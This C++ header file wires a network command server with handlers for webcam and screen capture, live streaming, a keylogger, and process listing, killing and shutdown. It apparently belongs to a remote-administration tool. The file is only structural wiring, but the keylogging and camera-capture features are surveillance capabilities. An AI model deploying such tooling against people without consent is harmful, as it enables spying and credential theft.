#pragma once

#include "capture/screen_capture.hpp"
#include "capture/webcam_capture.hpp"
#include "commands/command_registry.hpp"
#include "commands/handlers.hpp"
#include "core/interfaces.hpp"
#include "core/logger.hpp"
#include "net/server.hpp"
#include "services/keyboard_service.hpp"
#include "services/streaming_service.hpp"
#include "services/system_service.hpp"
#include <memory>

namespace cafe {

/**
 * @brief Application builder using Dependency Injection
 * Responsible for constructing and wiring all application components
 * 
 * This follows the Dependency Inversion Principle by:
 * 1. Creating concrete implementations
 * 2. Injecting them into components that depend on abstractions
 */
class ApplicationBuilder {
public:
    ApplicationBuilder() {
        // Create logger
        logger_ = std::make_shared<ConsoleLogger>();
        
        // Create capture devices
        webcam_ = std::make_shared<WebcamCapture>(0, 640, 480);
        screen_ = std::make_shared<ScreenCapture>();
        
        // Create services
        processManager_ = std::make_shared<LinuxProcessManager>();
        systemController_ = std::make_shared<LinuxSystemController>();
        keyboard_ = std::make_shared<LinuxKeyboardListener>();
        
        // Create streaming services
        webcamStreaming_ = std::make_shared<StreamingService>(webcam_);
        screenStreaming_ = std::make_shared<StreamingService>(screen_);
        
        // Register command handlers
        registerHandlers();
    }

    CommandRegistry& getRegistry() { return registry_; }
    ILogger& getLogger() { return *logger_; }

    std::unique_ptr<Server> build(uint16_t port) {
        return std::make_unique<Server>(port, registry_, *logger_);
    }

private:
    std::shared_ptr<ILogger> logger_;
    std::shared_ptr<WebcamCapture> webcam_;
    std::shared_ptr<ScreenCapture> screen_;
    std::shared_ptr<IProcessManager> processManager_;
    std::shared_ptr<ISystemController> systemController_;
    std::shared_ptr<IKeyboardListener> keyboard_;
    std::shared_ptr<StreamingService> webcamStreaming_;
    std::shared_ptr<StreamingService> screenStreaming_;
    CommandRegistry registry_;

    void registerHandlers() {
        // Capture commands
        registry_.registerHandler(
            std::make_shared<CaptureWebcamHandler>(webcam_));
        registry_.registerHandler(
            std::make_shared<CaptureScreenHandler>(screen_));
        
        // Streaming commands
        registry_.registerHandler(
            std::make_shared<StartWebcamStreamHandler>(webcamStreaming_));
        registry_.registerHandler(
            std::make_shared<StartScreenStreamHandler>(screenStreaming_));
        registry_.registerHandler(
            std::make_shared<StopStreamHandler>(webcamStreaming_, screenStreaming_));
        
        // Keylogger commands
        registry_.registerHandler(
            std::make_shared<KeyloggerHandler>(keyboard_));
        
        // Process commands
        registry_.registerHandler(
            std::make_shared<ListProcessHandler>(processManager_));
        registry_.registerHandler(
            std::make_shared<KillProcessHandler>(processManager_));
        
        // System commands
        registry_.registerHandler(
            std::make_shared<ShutdownHandler>(systemController_));
    }
};

} // namespace cafe
